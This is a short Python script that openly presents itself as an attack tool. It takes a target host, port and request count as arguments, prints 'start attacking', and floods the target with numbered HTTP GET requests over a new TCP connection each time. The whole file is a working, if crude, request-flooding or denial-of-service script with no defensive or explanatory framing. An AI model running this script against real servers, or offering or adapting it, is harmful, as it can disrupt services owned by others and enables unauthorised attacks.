import socket, sys

host = sys.argv[1]
port = int(sys.argv[2])
count = int(sys.argv[3])

print('> start attacking ' + host + '...')

def attack(toGet):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	print('[+] GET /' + toGet + ' HTTP/1.1')
	s.send(('GET /' + toGet + ' HTTP/1.1\r\n').encode('utf-8'))
	s.send(('Host: ' + host + '\r\n\r\n').encode('utf-8'))
	s.close()

for i in range(1, count+1):
	attack(str(i))